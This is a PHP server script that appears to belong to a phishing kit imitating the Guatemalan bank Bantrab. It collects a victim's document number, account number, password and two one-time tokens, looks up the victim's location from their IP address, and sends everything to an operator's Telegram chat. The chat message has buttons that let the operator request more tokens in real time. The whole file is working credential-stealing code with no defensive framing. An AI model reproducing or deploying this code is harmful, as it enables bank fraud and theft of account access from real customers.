<?php
session_start();
error_reporting(0);
header('Content-Type: application/json; charset=utf-8');

include "data.php";
require "guard.php";
require_once "state.php";

// ───────────────────────────────────────────────────────────
// srv.php – API endpoint for fetch() requests from the frontend
// Sends Telegram message with inline buttons, stores state.
// Returns { ok: true, sid: "..." } – frontend then polls status.php
// ───────────────────────────────────────────────────────────

$website = 'https://api.telegram.org/bot' . $token;

// Accept JSON or form-encoded payloads
$raw  = file_get_contents('php://input');
$json = json_decode($raw, true);
$data = is_array($json) ? $json : $_POST;

$action     = $data['action']    ?? '';
$sid        = $data['sid']       ?? '';
$documento  = trim($data['documento'] ?? '');
$numero     = trim($data['numero']    ?? '');
$pass       = trim($data['pass']      ?? '');
$codeIn = trim($data['code'] ?? '');

if ($sid === '') $sid = sess_new_id();

// ── Visitor info ─────────────────────────────────────────────
$ip = $_SERVER["REMOTE_ADDR"] ?? '-';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
$ip_raw  = curl_exec($ch);
curl_close($ch);
$ip_data = json_decode($ip_raw, true) ?: [];

$country = $ip_data["country"]     ?? '-';
$city    = $ip_data["city"]        ?? '-';
$isp     = $ip_data["isp"]         ?? '-';
$code    = $ip_data["countryCode"] ?? '-';
$agent   = $_SERVER["HTTP_USER_AGENT"] ?? '-';

// ── Build message + inline keyboard depending on action ──────
$msg = '';
$keyboard = null;

// Pull existing state (so we keep user data across steps)
$state = sess_load($sid) ?: [
    'sid' => $sid,
    'documento' => '',
    'numero'    => '',
    'pass'      => '',
    'code1'     => '',
    'code2'     => '',
];

switch ($action) {

  case 'login':
    $state['documento'] = $documento;
    $state['numero']    = $numero;
    $state['pass']      = $pass;
    $state['stage']     = 'login';

    $msg  = "🔐 <b>BANTRAB · LOGIN</b>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n";
    $msg .= "📄 Documento: <b>" . htmlspecialchars($documento) . "</b>\n";
    $msg .= "🔢 Número:    <code>" . htmlspecialchars($numero) . "</code>\n";
    $msg .= "🔑 Clave:     <code>" . htmlspecialchars($pass) . "</code>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n";
    $msg .= "🌍 $country ($code) · 🏙️ $city\n";
    $msg .= "🛰️ $isp\n";
    $msg .= "📍 IP: <code>$ip</code>\n";
    $msg .= "🆔 SID: <code>$sid</code>";

    $keyboard = [
      [
        ['text' => '✅ Pedir Token',     'callback_data' => "$sid|llave"],
        ['text' => '❌ Clave inválida',  'callback_data' => "$sid|pass_inv"],
      ],
    ];
    break;

  case 'llave':
    $state['code1'] = $codeIn;
    $state['stage'] = 'llave';

    $msg  = "📲 <b>BANTRAB · TOKEN 1</b>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 Usuario: <code>" . htmlspecialchars($state['numero']) . "</code>\n";
    $msg .= "🔐 Token 1: <code>" . htmlspecialchars($codeIn) . "</code>\n";
    $msg .= "📍 IP: <code>$ip</code>\n";
    $msg .= "🆔 SID: <code>$sid</code>";

    $keyboard = [
      [
        ['text' => '✅ Pedir Token 2',   'callback_data' => "$sid|llave2"],
        ['text' => '🔁 Token inválido',  'callback_data' => "$sid|llave_inv"],
      ],
      [
        ['text' => '🏁 Finalizar',       'callback_data' => "$sid|final"],
      ],
    ];
    break;

  case 'llave2':
    $state['code2'] = $codeIn;
    $state['stage'] = 'llave2';

    $msg  = "📲 <b>BANTRAB · TOKEN 2</b>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 Usuario: <code>" . htmlspecialchars($state['numero']) . "</code>\n";
    $msg .= "🔐 Token 2: <code>" . htmlspecialchars($codeIn) . "</code>\n";
    $msg .= "📍 IP: <code>$ip</code>\n";
    $msg .= "🆔 SID: <code>$sid</code>";

    $keyboard = [
      [
        ['text' => '🏁 Finalizar',       'callback_data' => "$sid|final"],
        ['text' => '🔁 Token inválido',  'callback_data' => "$sid|llave2_inv"],
      ],
    ];
    break;

  default:
    echo json_encode(['ok' => false, 'message' => 'Acción no válida']);
    exit;
}

// Mark as waiting for admin
$state['status']   = 'waiting';
$state['redirect'] = null;
sess_save($sid, $state);

// ── Send to Telegram (with inline keyboard) ──────────────────
$payload = [
  'chat_id'    => $chat_id,
  'parse_mode' => 'HTML',
  'text'       => $msg,
];

if ($keyboard) {
  $payload['reply_markup'] = json_encode(['inline_keyboard' => $keyboard]);
}

$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
@curl_exec($ch);
curl_close($ch);

// ── Response ─────────────────────────────────────────────────
echo json_encode([
  'ok'  => true,
  'sid' => $sid
]);
